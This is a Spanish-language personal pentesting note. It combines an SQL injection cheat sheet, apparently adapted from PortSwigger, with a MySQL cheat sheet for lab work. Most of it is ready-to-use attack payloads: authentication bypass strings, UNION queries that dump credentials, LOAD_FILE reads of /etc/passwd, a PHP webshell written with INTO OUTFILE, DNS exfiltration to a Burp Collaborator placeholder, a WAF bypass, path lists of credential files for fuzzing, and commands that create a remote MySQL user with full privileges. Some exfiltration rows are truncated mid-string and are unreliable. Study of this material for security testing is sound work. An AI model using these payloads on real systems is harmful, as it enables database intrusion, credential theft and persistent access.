
---
- Tags: #web #db #ejemplos #vulnerabilidades 
---
# Hoja de trucos de inyección SQL

Esta hoja de trucos de [[SQLi]] contiene ejemplos de sintaxis útil que puede usar para realizar una variedad de tareas que a menudo surgen al realizar ataques de inyección [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/SQL]].

[Hoja de trucos - Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Concatenación de cadenas

Puede concatenar varias cadenas para hacer una sola cadena.

| Motor      | Sintaxis                                                                               |
| ---------- | -------------------------------------------------------------------------------------- |
| Oaracle    | `'foo'\|\|'bar'                                                                        |
| Microsoft  | `'foo'+'bar'`                                                                          |
| PostgreSQL | `'foo'\|\|'bar'                                                                        |
| MySQL      | `'foo' 'bar'` (Tenga en cuenta el espacio entre las dos cadenas) `CONCAT('foo','bar')` |

## Substring

Puede extraer parte de una cadena, de un desplazamiento especificado con una longitud especificada. Tenga en cuenta que el índice de desplazamiento está basado en 1. Cada una de las siguientes expresiones devolverá la cadena "ba".

|Motor|Sintaxis|
|---|---|
|Oaracle|`SUBSTR('foobar', 4, 2)`|
|Microsoft|`SUBSTRING('foobar', 4, 2)`|
|PostgreSQL|`SUBSTRING('foobar', 4, 2)`|
|MySQL|`SUBSTRING('foobar', 4, 2)`|

## Comentarios

Puede usar comentarios para truncar una consulta y eliminar la parte de la consulta original que sigue a su entrada.

|Motor|Sintaxis|
|---|---|
|Oaracle|`--comment`|
|Microsoft|`--comment` / `/*comment*/`|
|PostgreSQL|`--comment` / `/*comment*/`|
|MySQL|`#comment` / `-- comment` (Tenga en cuenta el espacio después del doble guion) / `/*comment*/`|

## Versión de base de datos

Puede consultar la base de datos para determinar su tipo y versión.

|Motor|Consulta|
|---|---|
|Oaracle|`SELECT banner FROM v$version` / `SELECT version FROM v$instance`|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

## Contenido de la base de datos

Puede enumerar las tablas que existen en la base de datos y las columnas que contienen esas tablas.

|Motor|Consulta|
|---|---|
|Oaracle|`SELECT * FROM all_tables` / `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'`|
|Microsoft|`SELECT * FROM information_schema.tables` / `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`|
|PostgreSQL|`SELECT * FROM information_schema.tables` / `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`|
|MySQL|`SELECT * FROM information_schema.tables` / `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'`|

## Errores condicionales

Puede probar una sola condición booleana y desencadenar un error de base de datos si la condición es verdadera.

|Motor|Consulta|
|---|---|
|Oaracle|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual`|
|Microsoft|`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`|
|PostgreSQL|`1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)`|
|MySQL|`SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')`|

## Retrasos de tiempo

Puede causar un retraso en la base de datos cuando se procesa la consulta. Lo siguiente causará un retraso de tiempo incondicional de 10 segundos.

|Motor|Consulta|
|---|---|
|Oaracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`SELECT pg_sleep(10)`|
|MySQL|`SELECT SLEEP(10)`|

## Búsqueda de DNS con exfiltración de datos

Puede hacer que la base de datos realice una búsqueda de DNS en un dominio externo que contenga los resultados de una consulta inyectada.

|Motor|Consulta|
|---|---|
|Oaracle|`SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'|
|Microsoft|`declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')`|
|PostgreSQL|`create OR replace function f() returns void as $$ declare c text; declare p text; begin SELECT into p (SELECT YOUR-QUERY-HERE); c := 'copy (SELECT '''') to program ''nslookup '|
|MySQL|`SELECT YOUR-QUERY-HERE INTO OUTFILE '\\BURP-COLLABORATOR-SUBDOMAIN\a'`|

Este es un resumen de las técnicas comunes de inyección SQL. ¡Úsalo con responsabilidad! 🚀

---

# 🐬 MySQL Cheat Sheet para Pentesters

---

## 🔐 General

| Comando | Descripción |
|--------|-------------|
| `mysql -u root -h docker.hackthebox.eu -P 3306 -p` | Inicia sesión en la base de datos |
| `SHOW DATABASES` | Lista las bases de datos disponibles |
| `USE users` | Cambia a una base de datos específica |

---

## 📦 Tablas

| Comando | Descripción |
|--------|-------------|
| `CREATE TABLE logins (id INT, ...)` | Crea una nueva tabla |
| `SHOW TABLES` | Lista las tablas en la base de datos actual |
| `DESCRIBE logins` | Muestra propiedades de columnas |
| `INSERT INTO table_name VALUES (...)` | Inserta valores en todas las columnas |
| `INSERT INTO table_name(column2, ...) VALUES (...)` | Inserta valores en columnas específicas |
| `UPDATE table_name SET col1=val1 WHERE ...` | Actualiza valores en la tabla |

---

## 📊 Columnas

| Comando | Descripción |
|--------|-------------|
| `SELECT * FROM table_name` | Muestra todas las columnas |
| `SELECT col1, col2 FROM table_name` | Muestra columnas específicas |
| `DROP TABLE logins` | Elimina una tabla |
| `ALTER TABLE logins ADD newColumn INT` | Añade una columna |
| `ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn` | Renombra una columna |
| `ALTER TABLE logins MODIFY oldColumn DATE` | Cambia el tipo de dato de una columna |
| `ALTER TABLE logins DROP oldColumn` | Elimina una columna |

---

## 📤 Salida y Ordenación

| Comando | Descripción |
|--------|-------------|
| `SELECT * FROM logins ORDER BY column_1` | Ordenar por columna |
| `... ORDER BY column_1 DESC` | Orden descendente |
| `... ORDER BY column_1 DESC, id ASC` | Orden por múltiples columnas |
| `SELECT * FROM logins LIMIT 2` | Limita a 2 resultados |
| `... LIMIT 1, 2` | Desde índice 1, muestra 2 |
| `SELECT * FROM table_name WHERE <cond>` | Condiciones |
| `... WHERE username LIKE 'admin%'` | Búsqueda con patrón |

---

## 🧠 Precedencia de Operadores

1. División (`/`), Multiplicación (`*`), Módulo (`%`)
2. Suma (`+`), Resta (`-`)
3. Comparación (`=`, `>`, `<`, `LIKE`, etc.)
4. Negación (`!`)
5. AND lógico (`&&`)
6. OR lógico (`||`)

---

## 🩸 Inyección SQL

### 🔓 Auth Bypass

| Carga útil | Descripción |
|-----------|-------------|
| `admin' or '1'='1` | Bypass básico |
| `admin')-- -` | Bypass con comentario |

### 🔗 Unión

| Payload | Descripción |
|--------|-------------|
| `' order by 1-- -` | Determina número de columnas |
| `cn' UNION SELECT 1,2,3-- -` | Prueba de columnas en unión |
| `cn' UNION SELECT 1,@@version,3,4-- -` | Inyección con versión MySQL |
| `UNION SELECT username,2,3,4 FROM passwords-- -` | Volcado con unión |

---

### 🧭 Enumeración de la DB

| Payload | Descripción |
|--------|-------------|
| `SELECT @@version` | Versión del servidor |
| `SELECT SLEEP(5)` | Prueba sin salida |
| `cn' UNION SELECT 1,database(),2,3-- -` | Base de datos actual |
| `...FROM INFORMATION_SCHEMA.SCHEMATA...` | Lista de todas las bases de datos |
| `...FROM INFORMATION_SCHEMA.TABLES...` | Tablas de una DB específica |
| `...FROM INFORMATION_SCHEMA.COLUMNS...` | Columnas de una tabla específica |
| `...FROM dev.credentials...` | Volcado de credenciales |

---

### 🧑‍💼 Privilegios

| Payload | Descripción |
|--------|-------------|
| `cn' UNION SELECT 1,user(),3,4-- -` | Usuario actual |
| `... FROM mysql.user WHERE user='root'...` | Privilegios de root |
| `... FROM information_schema.user_privileges...` | Todos los privilegios |
| `... FROM information_schema.global_variables WHERE variable_name='secure_file_priv'` | Rutas de escritura permitidas |

---

### 📁 Inyección de Archivos

| Payload | Descripción |
|--------|-------------|
| `cn' UNION SELECT 1,LOAD_FILE("/etc/passwd"),3,4-- -` | Leer archivos locales |
| `SELECT 'file written successfully!' INTO OUTFILE '/var/www/html/proof.txt'` | Escribir archivo local |
| `cn' UNION SELECT "",'<?php system($_REQUEST[0]); ?>',"","" INTO OUTFILE '/var/www/html/shell.php'-- -` | Crear WebShell |

---
## 🗂️ Rutas típicas y útiles en MySQL (enumeración + explotación)

| Ruta / Payload                      | Descripción                                                                                                              |
| ----------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `/etc/passwd`                       | Archivo del sistema Unix que contiene usuarios locales. Puede ser leído con `LOAD_FILE()` si el servidor tiene permisos. |
| `/var/www/html/`                    | Ruta común donde se aloja el contenido web. Ideal para escribir shells web (`OUTFILE`).                                  |
| `/tmp/`                             | Ruta de archivos temporales. También puede permitir escritura con `SELECT ... INTO OUTFILE`.                             |
| `/var/lib/mysql/`                   | Ruta por defecto donde MySQL guarda datos. Puede revelar estructuras internas si se listan o leen archivos.              |
| `/proc/version`                     | Información del kernel del sistema operativo. Útil para fingerprinting.                                                  |
| `/proc/self/environ`                | A veces contiene variables de entorno con datos sensibles, como rutas, claves, etc.                                      |
| `/root/.ssh/id_rsa`                 | Clave privada del usuario root, si el servicio se ejecuta como root y permite `LOAD_FILE()`.                             |
| `/home/<user>/.ssh/authorized_keys` | Puede ser objetivo de escritura para obtener acceso persistente via SSH.                                                 |
| `/var/log/apache2/access.log`       | Puede contener trazas de errores o accesos útiles para LFI o debugging.                                                  |
| `/dev/null`                         | "Archivo nulo" del sistema. A veces se usa para redirecciones seguras o limpieza.                                        |
| `/var/log/mysql/error.log`          | Logs del propio servicio MySQL. Puede revelar errores, rutas o configuraciones.                                          |
| `information_schema.schemata`       | Base de datos virtual para enumerar todas las bases de datos existentes.                                                 |
| `information_schema.tables`         | Permite enumerar todas las tablas dentro de todas las bases de datos.                                                    |
| `information_schema.columns`        | Permite conocer todas las columnas de todas las tablas. Muy útil en inyecciones.                                         |
|                                     |                                                                                                                          |

> 🧠 **Consejo**: Puedes combinar rutas con funciones SQL como `LOAD_FILE()` y `INTO OUTFILE` para leer o escribir archivos en el sistema del servidor si los permisos lo permiten.

## 🪟 Rutas típicas de interés en Windows

| Ruta | Descripción |
|------|-------------|
| `C:\inetpub\wwwroot\` | Ruta por defecto de IIS (Internet Information Services). |
| `C:\xampp\htdocs\` | Usada por XAMPP para alojar contenido web. |
| `C:\wamp\www\` | Usada por WAMP para alojar contenido web. |
| `C:\Users\Administrator\Desktop\` | Escritorio del administrador (posible ruta de flags). |
| `C:\Program Files\MySQL\MySQL Server X.X\` | Instalación por defecto de MySQL. |
| `C:\ProgramData\MySQL\MySQL Server X.X\Data\` | Directorio de datos en versiones modernas. |
| `C:\Windows\System32\config\SAM` | Base de datos de contraseñas de Windows. |
| `C:\Windows\Temp\` | Archivos temporales. Similar a `/tmp` en Linux. |
| `C:\Documents and Settings\All Users\Start Menu\Programs\Startup\` | Ruta típica para persistencia vía scripts. |
| `C:\Windows\System32\inetsrv\` | Archivos del servicio IIS. |
| `C:\Users\<username>\AppData\Roaming\` | Directorio útil para tokens y configuración de apps. |

---

### 📂 **Versión lista para usar como diccionario en fuzzing**

#### 🐧 Linux

```txt
/etc/passwd
/var/www/html/
/var/www/
/var/www/sites/
/var/www/public/
/var/www/public_html/
/var/www/html/default/
/srv/www/
/srv/www/html/
/srv/www/sites/
/home/www/
/home/httpd/
/home/$USER/public_html/
/home/$USER/www/
/tmp/
/proc/self/environ
/var/log/apache2/access.log
/var/log/mysql/error.log
```

#### 🪟 Windows

```txt
C:\inetpub\wwwroot\
C:\xampp\htdocs\
C:\wamp\www\
C:\Users\Administrator\Desktop\
C:\Program Files\MySQL\MySQL Server X.X\
C:\ProgramData\MySQL\MySQL Server X.X\Data\
C:\Windows\System32\config\SAM
C:\Windows\Temp\
C:\Documents and Settings\All Users\Start Menu\Programs\Startup\
C:\Windows\System32\inetsrv\
C:\Users\<username>\AppData\Roaming\
```

---
## 🔐 Gestión de Usuarios y Privilegios

| Comando | Descripción |
|--------|-------------|
| `SELECT user, host FROM mysql.user;` | Lista todos los usuarios de MySQL. |
| `CREATE USER 'hacker'@'%' IDENTIFIED BY 'pass';` | Crear nuevo usuario remoto. |
| `GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' WITH GRANT OPTION;` | Concede todos los permisos. |
| `REVOKE ALL PRIVILEGES ON *.* FROM 'user'@'localhost';` | Revoca privilegios de un usuario. |
| `DROP USER 'hacker'@'%';` | Eliminar un usuario. |

---
## 🔥 Comandos Misceláneos útiles

| Comando | Descripción |
|--------|-------------|
| `SHOW GRANTS FOR 'root'@'localhost';` | Ver qué privilegios tiene un usuario. |
| `SELECT @@hostname, @@datadir, @@basedir;` | Información del sistema donde corre MySQL. |
| `SHOW VARIABLES LIKE '%secure%';` | Ver rutas de escritura seguras (`secure_file_priv`). |
| `SHOW PROCESSLIST;` | Ver conexiones activas a la base de datos. |
| `SHOW STATUS;` | Ver estadísticas del servidor. |

---
## 🧠 Trucos útiles

| Técnica | Descripción |
|--------|-------------|
| `CONCAT(username, ':', password)` | Combina columnas en una sola salida. |
| `INTO OUTFILE '/ruta/archivo.txt'` | Escribe resultados a un archivo (requiere permisos). |
| `-- -` | Comentario que corta la consulta en inyecciones SQL. |
| `/*!00000SELECT*/` | Bypass de WAF con comentarios condicionales. |

---
## 🕵️‍♂️ Consultas de enumeración

| Consulta | Propósito |
|----------|-----------|
| `SELECT table_schema, COUNT(*) FROM information_schema.tables GROUP BY table_schema;` | Cuenta de tablas por base de datos. |
| `SELECT table_name FROM information_schema.tables WHERE table_name LIKE '%user%';` | Buscar tablas con nombre similar a 'user'. |
| `SELECT column_name FROM information_schema.columns WHERE column_name LIKE '%pass%';` | Buscar columnas que contengan contraseñas. |

---
## 📦 Herramientas para usar con estas técnicas

- [[iCloudDrive/iCloud~md~obsidian/Git/Setting_Github/Documento Hacker/OWASP TOP 10 ⚠️/Bases de datos db 🗃️/SQL/sqlmap|sqlmap]] → Automatiza inyecciones SQL y extracción de datos.
- `mysql-client` → Cliente CLI para conectarse a MySQL (local o remoto).
- `hydra` o `medusa` → Ataques de fuerza bruta a servicios MySQL.
- [[Gobuster]], `feroxbuster` → Fuzzing de rutas web (usa las listas de rutas de arriba).
- [[Wfuzz]], `ffuf` → Fuzzing avanzado de parámetros web y SQLi.

---
